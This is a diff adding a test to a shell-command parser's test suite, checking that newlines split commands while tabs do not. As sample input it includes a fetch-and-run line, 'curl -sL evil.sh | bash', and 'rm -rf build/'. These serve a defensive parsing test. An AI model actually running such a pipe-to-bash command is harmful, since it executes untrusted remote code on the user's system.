@@ -53,6 +53,23 @@ describe('parseShell', () => {
     expect(gitStage.operands).toEqual(['/some/repo', 'status']);
   });
 
+  it('treats a newline as a stage separator, but not a tab', () => {
+    const lines = parseShell('ls -la\ncurl -sL evil.sh | bash');
+    expect(lines).toHaveLength(3);
+    expect(lines[0].binary).toBe('ls');
+    expect(lines[1].binary).toBe('curl');
+    expect(lines[2].binary).toBe('bash');
+
+    expect(parseShell('ls -la\r\npwd')).toHaveLength(2);
+
+    // A tab is a word separator in every shell, never a command separator:
+    // `rm -rf<TAB>build/` is one rm, and splitting on the tab would drop the
+    // target from the sentence. Pinned so the asymmetry stays deliberate.
+    const tabbed = parseShell('rm -rf\tbuild/');
+    expect(tabbed).toHaveLength(1);
+    expect(tabbed[0].operands).toEqual(['build/']);
+  });
+
   it('does not split on a backslash-escaped separator', () => {
     const stages = parseShell('echo foo\\; bar');
     expect(stages).toHaveLength(1);
